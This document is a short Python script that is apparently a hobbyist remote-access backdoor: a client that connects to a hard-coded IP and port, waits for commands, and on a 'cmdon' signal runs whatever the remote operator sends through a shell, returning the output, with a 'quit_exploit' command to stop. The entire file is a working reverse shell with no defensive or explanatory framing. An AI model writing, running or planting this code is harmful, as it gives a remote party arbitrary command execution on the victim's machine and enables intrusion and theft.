import socket
from subprocess import PIPE, Popen


HOST = '192.168.0.145' #Your IP address, get from cmd with command line: ipconfig
PORT = 9090
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((HOST, PORT))
cmd_mode = False
while True:
    server_command = client.recv(1024).decode('utf-8')
    if server_command == "cmdon":
        cmd_mode = True
        client.send("you have now terminal access".encode('utf-8'))
        continue
    if server_command =="cmdoff":
        cmd_mode = False
    if cmd_mode:
        print(f"Executing command {server_command}")
        with Popen(server_command, stdout=PIPE, stderr=None, shell=True) as process:
            output = process.communicate()[0].decode("utf-8")
            client.send(f"Output of command: \n\n{output}".encode('utf-8'))
    elif server_command == "quit_exploit":
        break
    else:
        if server_command == "fool":
            print("You've been fooled")
    client.send(f"{server_command} was successfully executed!".encode('utf-8'))